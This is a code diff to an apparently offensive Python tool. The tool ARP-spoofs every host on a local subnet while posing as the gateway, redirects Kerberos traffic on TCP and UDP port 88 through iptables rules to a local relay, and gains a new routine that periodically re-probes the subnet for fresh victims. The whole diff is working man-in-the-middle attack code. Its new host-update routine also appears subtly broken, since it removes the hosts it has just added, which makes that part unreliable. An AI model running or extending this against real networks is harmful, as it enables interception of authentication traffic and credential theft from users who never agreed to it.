@@ -110,10 +110,28 @@ def restore_listenmode(dic_mac_addresses):
         send(packet, verbose = False, count=1)
 
 
+# def relaymode_arp_spoof(spoofed_ip):
+#     while not stop_arp_spoofing_flag.is_set() and Targets != set():
+#         send(ARP(op = 2, pdst = list(Targets), psrc = spoofed_ip), verbose = False)
+#         time.sleep(1)
+
+def update_uphosts():
+    mac_addresses = get_all_mac_addresses()
+    new_hosts = set(mac_addresses.keys()) - {gw, my_ip} - Targets
+    old_hosts = Targets - set(mac_addresses.keys())
+    Targets.update(new_hosts)
+    Targets.difference_update(new_hosts)
+
+
 def relaymode_arp_spoof(spoofed_ip):
+    timer = 0
     while not stop_arp_spoofing_flag.is_set() and Targets != set():
         send(ARP(op = 2, pdst = list(Targets), psrc = spoofed_ip), verbose = False)
         time.sleep(1)
+        timer += 1
+        if net_probe and timer == 7 :
+            update_uphosts()
+            timer = 0
 
 def listenmode_arp_spoof():
     while not stop_arp_spoofing_flag.is_set() and Targets != set():
@@ -223,10 +241,12 @@ async def relay_server():
     os.system("iptables -F -t nat")
     logging.info('[*] Saved current iptables\n\n')
     os.system(f'iptables -t nat -A PREROUTING -i {iface} -p tcp --dport 88 -j DNAT --to 127.0.0.1:88')
-    # os.system(f'iptables -t nat -A PREROUTING -i {iface} -p udp --dport 88 -j DNAT --to 127.0.0.1:88')
+    os.system(f'iptables -t nat -A PREROUTING -i {iface} -p udp --dport 88 -j DNAT --to 127.0.0.1:88')
     os.system(f'sysctl -w net.ipv4.conf.{iface}.route_localnet=1 1>/dev/null')
 
     server = await asyncio.start_server(handle_client, '0.0.0.0', 88)
+
+    loop = asyncio.get_event_loop()
 
     async with server:
         await server.serve_forever()
@@ -345,6 +365,7 @@ if __name__ == '__main__':
     logging.info(f'[*] Interface : {iface}')
     os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
     logging.info('[*] Enabled IPV4 forwarding')
+    net_probe = False
 
     if not disable_spoofing :
         if parameters.t is not None :
@@ -373,6 +394,7 @@ if __name__ == '__main__':
             TargetsList = [str(ip) for ip in subnet.hosts()]
             TargetsList.remove(gw)
             logging.info(f'[*] Targets not supplied, will use local subnet {subnet} minus the gateway')
+            if keep_spoofing : net_probe = True
 
         if gw in TargetsList and (parameters.t is not None or parameters.tf is not None) :
             logging.info('[*] Found gateway in targets list. Removing it')
@@ -401,6 +423,7 @@ if __name__ == '__main__':
                 sys.exit(1)
             thread = threading.Thread(target=relaymode_arp_spoof, args=(gw,))
             thread.start()
+
         logging.info('[+] Started ARP spoofing')
     else :
         logging.warning(f'[!] ARP spoofing disabled')
